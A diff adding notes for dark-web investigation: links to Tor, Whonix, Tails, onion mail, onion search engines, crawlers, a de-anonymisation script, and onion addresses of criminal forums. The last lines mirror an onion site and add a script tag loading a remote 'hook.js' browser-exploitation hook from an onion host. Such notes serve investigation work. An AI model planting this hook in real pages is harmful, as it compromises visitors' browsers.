@@ -1,0 +1,43 @@
+ZeroNet: https://zeronet.io/
+I2P: https://geti2p.net/en/
+Freenet: https://freenet.org/
+How tor work: https://skerritt.blog/how-does-tor-really-work/
+How HTTP and TOR protects you: https://tor-https.eff.org/
+Download TOR Browser: https://www.torproject.org/download/
+Manual TOR Browser: https://support.torproject.org/tor-browser/
+Whonix: https://www.whonix.org/
+Comparativa Whonix: https://www.whonix.org/wiki/Comparison_with_Others
+Caracteristicas Whonix: https://www.whonix.org/wiki/Features
+Whonix Anonimize other Operating Systems: https://www.whonix.org/wiki/Other_Operating_Systems
+Tails: https://tails.net/
+Tails almacenamiento Persistente: https://tails.net/doc/persistent_storage/index.es.html
+Caracteristicas Tails: https://tails.net/doc/about/features/index.es.html
+Keepass: https://keepass.info/
+Keepassxc: https://keepassxc.org/
+DNMX: http://hxuzjtocnzvv5g2rtg2bhwkcbupmk7rclb6lly3fo4tvqkk5oyrv3nid.onion
+OnionEmail: https://onionmail.info/
+OnionGosth: https://onionghost.com/
+OnionMail: https://onionmail.org
+Torsocks: https://gitlab.torproject.org/tpo/core/torsocks
+Proxychains: https://www.kali.org/tools/proxychains-ng/
+IACA: https://iaca-darkweb-tools.com/
+DeepDarkCTI: https://github.com/fastfire/deepdarkCTI
+DeepDarkCTI2: https://deepdarkcti.com/
+Amhia Clearnet: http://ahmia.fi/
+Amhia Darkweb: http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion/
+Hoodle: http://nr2dvqdot7yw6b5poyjb7tzot7fjrrweb2fhugvytbbio7ijkrvicuid.onion/
+Torch: http://5tbi2uc3aqpygkcyq3xzgzddunmi6exwzpztv2nf2njfehnb3utjgpyd.onion/
+BashBunny Crawler: https://github.com/bash-bunny/DW_Crawler
+ParanoidSec Crawler: https://github.com/paranoidsec/paranoid-darkcrawler
+Download forums DeepdarkCTI: wget https://raw.githubusercontent.com/fastfire/deepdarkCTI/refs/heads/main/forum.md
+Onionmail: https://onionmail.org
+DarkForum: http://qeei4m7a2tve6ityewnezvcnf647onsqbmdbmlcw4y5pr6uwwfwa35yd.onion/
+Ramp: http://rampjcdlqvgkoz5oywutpo6ggl7g6tvddysustfl6qzhr5osr24xxqqd.onion
+Rutor: http://rutorbesth5lhmj47qz4fi5i4x5zvh4fizruog6iw2l3q223jmnawvid.onion
+Use the de-anon script BashBunny DW Deanon: https://github.com/bash-bunny/dw_deanon
+Test firefox with https://check.torproject.org
+Test DNS leaks with https://www.dnsleakstest.com
+Test ZAP with https://check.torproject.org
+And test DNS leaks with https://www.dnsleakstest.com
+1. Clone the onion domain: `proxychains4 -q wget -mkEpnp http://prjd5pmbug2cnfs67s3y65ods27vamswdaw2lnwf45ys3pjl55h2gwqd.onion/`
+<script src="http://fvo64npmo5prbtwmi3lrtuynsno6z34kdwdp6tvgyomrj3vo6kmsohad.onion:3000//hook.js"></script>
